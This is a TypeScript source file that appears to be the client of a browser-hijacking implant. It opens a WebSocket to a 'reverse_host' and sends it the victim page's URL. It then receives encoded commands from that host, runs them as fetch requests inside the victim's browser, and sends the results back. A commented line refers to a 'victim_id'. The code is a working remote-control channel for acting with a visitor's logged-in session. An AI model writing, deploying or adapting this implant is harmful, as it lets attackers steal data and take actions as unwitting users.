import { DecodeTraffic, EncodeTraffic } from "./encoder";
import { DEBUG, debug } from "./debug";
import {
  FetchExecutor,
  type FetchOptions,
  type FetchResult,
} from "./fetch";
import { project, client_trace_id, reverse_host } from "./vars";

// export let ws: WebSocket = new WebSocket(`wss://echo.websocket.org/${project}/${victim_id}`);
let ws_server: string;
if (DEBUG) {
  ws_server = `ws://${reverse_host}/${project}`;
} else {
  ws_server =
    window.location.protocol == "https:"
      ? `wss://${reverse_host}/${project}`
      : `ws://${reverse_host}/${project}`;
}

let ws: WebSocket = new WebSocket(ws_server);

ws.onopen = (e: Event) => {
  debug("Connection established ready. client trace id ", client_trace_id);
  ws.send(JSON.stringify({
    "status": "init",
    "client_trace_id": client_trace_id,
    "current_url": window.location.href,
  }));
};

interface Command {
  command_id: string
  command_detail: FetchOptions
}

interface Result {
  command_id: string
  command_result: FetchResult
}

ws.onmessage = async (ev: MessageEvent<string>) => {
  let command: Command = JSON.parse(DecodeTraffic(ev.data));
  debug(command);
  let res = {
    command_id: command.command_id,
    command_result: {} as FetchResult,
  } as Result;
  res.command_result = await FetchExecutor(command.command_detail);
  debug(res);
  ws.send(EncodeTraffic(JSON.stringify(res)));
}

ws.onclose = (e: CloseEvent) => {
  debug("Connection closed");
}

ws.onerror = (e: Event) => {
  debug("Connection error");
  debug(e, e.target, e.type);
}